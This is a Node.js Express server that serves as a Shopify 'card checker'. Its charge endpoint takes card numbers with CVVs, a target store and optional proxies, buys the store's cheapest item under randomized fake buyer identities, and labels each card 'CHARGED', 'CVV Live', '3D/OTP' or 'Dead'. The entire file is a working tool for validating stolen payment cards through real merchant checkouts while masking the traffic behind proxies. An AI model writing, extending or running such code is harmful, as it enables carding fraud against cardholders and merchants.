const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const app = express();

app.use(express.json());

let requestCount = 0;

function generateRandomProfile() {
    const firstNames = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"];
    const lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Jackson", "Thompson", "White"];
    
    const streets = [
        { name: "1428 Elm Street", city: "Los Angeles", state: "CA", zip: "90001", code: "US" },
        { name: "742 Evergreen Terrace", city: "Springfield", state: "OR", zip: "97477", code: "US" },
        { name: "221b Baker Road", city: "New York", state: "NY", zip: "10001", code: "US" },
        { name: "404 Not Found Lane", city: "Austin", state: "TX", zip: "78701", code: "US" },
        { name: "1060 West Addison Street", city: "Chicago", state: "IL", zip: "60613", code: "US" },
        { name: "350 5th Ave", city: "New York", state: "NY", zip: "10118", code: "US" },
        { name: "600 E Washington St", city: "Phoenix", state: "AZ", zip: "85004", code: "US" },
        { name: "1600 Amphitheatre Pkwy", city: "Mountain View", state: "CA", zip: "94043", code: "US" }
    ];

    const fName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const location = streets[Math.floor(Math.random() * streets.length)];
    const randomNum = Math.floor(10000 + Math.random() * 90000);
    const email = `${fName.toLowerCase()}.${lName.toLowerCase()}${randomNum}@gmail.com`;

    return {
        first_name: fName,
        last_name: lName,
        email: email,
        address1: location.name,
        city: location.city,
        province_code: location.state,
        country_code: location.code,
        zip: location.zip
    };
}

app.get('/', (req, res) => {
    res.send({ status: "Shopify HTTP API Request Engine Active", uptime: process.uptime() });
});

app.get('/health', (req, res) => {
    res.json({ status: "OK", uptime: process.uptime(), memory: process.memoryUsage() });
});

app.get('/metrics', (req, res) => {
    res.json({
        requests_handled: requestCount,
        uptime_seconds: process.uptime(),
        memory_usage_mb: Math.round(process.memoryUsage().rss / 1024 / 1024)
    });
});

app.post('/api/charge', async (req, res) => {
    requestCount++;
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }

    let cleanSite = site.trim().replace(/\/$/, '');
    if (!cleanSite.startsWith('http')) {
        cleanSite = 'https://' + cleanSite;
    }

    const [ccNo, expMonth, expYear, cvv] = card.split('|');

    if (!ccNo || ccNo.length < 15 || ccNo.length > 16 || !expMonth || !expYear || !cvv) {
        return res.json({ status: "Dead", message: "INVALID_CARD_FORMAT", gateway: "Shopify Payments", price: "-", site: cleanSite });
    }

    const profile = generateRandomProfile();
    console.log(`⚡ [HTTP API] Target: ${cleanSite} | Buyer: ${profile.email}`);

    let agent = null;
    if (proxy && typeof proxy === 'string' && proxy.trim().length > 0) {
        let pClean = proxy.trim();
        const parts = pClean.split(':');
        let proxyUrl = "";
        if (parts.length >= 4) {
            proxyUrl = `http://${parts[2]}:${parts.slice(3).join(':')}@${parts[0]}:${parts[1]}`;
        } else {
            proxyUrl = `http://${pClean}`;
        }
        agent = new HttpsProxyAgent(proxyUrl);
    }

    const fetchOptions = agent ? { agent } : {};

    try {
        const prodRes = await fetch(`${cleanSite}/products.json?limit=15`, { ...fetchOptions, timeout: 15000 });
        if (!prodRes.ok) {
            return res.json({ status: "Dead", message: "STORE_CONNECTION_FAILED", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        const prodData = await prodRes.json();
        let selectedVariantId = null;
        let lowestPrice = Infinity;

        if (prodData && prodData.products) {
            for (const prod of prodData.products) {
                for (const v of prod.variants) {
                    const p = parseFloat(v.price);
                    if (p > 0 && v.available && p < lowestPrice) {
                        lowestPrice = p;
                        selectedVariantId = v.id;
                    }
                }
            }
        }

        if (!selectedVariantId) {
            return res.json({ status: "Dead", message: "NO_AVAILABLE_PRODUCTS", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        const formattedPrice = `$${lowestPrice.toFixed(2)}`;

        const cartRes = await fetch(`${cleanSite}/cart/add.js`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: selectedVariantId, quantity: 1 }),
            ...fetchOptions,
            timeout: 10000
        });

        if (!cartRes.ok) {
            return res.json({ status: "Dead", message: "CART_ADD_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({
                credit_card: { number: ccNo, month: expMonth, year: expYear, name: `${profile.first_name} ${profile.last_name}`, verification_value: cvv }
            }),
            ...fetchOptions,
            timeout: 10000
        });

        const vaultData = await vaultRes.json();
        if (!vaultData || !vaultData.id) {
            return res.json({ status: "Dead", message: "CARD_VAULT_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const checkoutUrl = `${cleanSite}/checkout`;
        
        await fetch(checkoutUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' },
            body: JSON.stringify({
                step: 'contact_information',
                checkout: {
                    email: profile.email,
                    shipping_address: {
                        address1: profile.address1,
                        city: profile.city,
                        country_code: profile.country_code,
                        province_code: profile.province_code,
                        zip: profile.zip,
                        first_name: profile.first_name,
                        last_name: profile.last_name
                    }
                }
            }),
            ...fetchOptions,
            timeout: 15000
        });

        const paymentRes = await fetch(checkoutUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' },
            body: JSON.stringify({
                step: 'payment',
                s: vaultData.id,
                checkout: {
                    credit_card: { vault_id: vaultData.id },
                    remember_me: false
                }
            }),
            ...fetchOptions,
            timeout: 20000
        });

        const paymentText = await paymentRes.text();
        let paymentJson = {};
        try {
            paymentJson = JSON.parse(paymentText);
        } catch (e) {}

        const combinedText = (paymentText + " " + JSON.stringify(paymentJson)).toLowerCase();
        let rawJsonString = JSON.stringify(paymentJson).toLowerCase();

        // Strict Success: Must have thank_you URL and explicitly NOT contain error keywords
        const isStrictSuccess = 
            (paymentRes.url.includes('thank_you') || combinedText.includes('thank_you')) &&
            (combinedText.includes('transactions') || combinedText.includes('order_number')) &&
            !combinedText.includes('error') &&
            !combinedText.includes('declined') &&
            !combinedText.includes('insufficient') &&
            !rawJsonString.includes('error') &&
            !rawJsonString.includes('failure');

        if (isStrictSuccess) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (rawJsonString.includes('insufficient_funds') || rawJsonString.includes('insufficient funds') || combinedText.includes('insufficient_funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (rawJsonString.includes('three_d_secure') || rawJsonString.includes('challenge') || combinedText.includes('3d_secure')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (rawJsonString.includes('incorrect_cvc') || rawJsonString.includes('security code')) {
            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else {
            let reason = "DECLINED_BY_PROCESSOR";
            if (rawJsonString.includes('incorrect_number') || combinedText.includes('incorrect number')) reason = "INCORRECT_CARD_NUMBER";
            else if (rawJsonString.includes('expired')) reason = "EXPIRED_CARD";
            else if (rawJsonString.includes('stolen')) reason = "STOLEN_CARD";

            return res.json({ status: "Dead", message: reason, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

    } catch (err) {
        console.log(`🔥 [HTTP API EXCEPTION]: ${err.message}`);
        return res.json({ status: "Dead", message: `ERR_${err.message.substring(0, 30).toUpperCase()}`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`HTTP Request Engine running on port ${PORT}`));
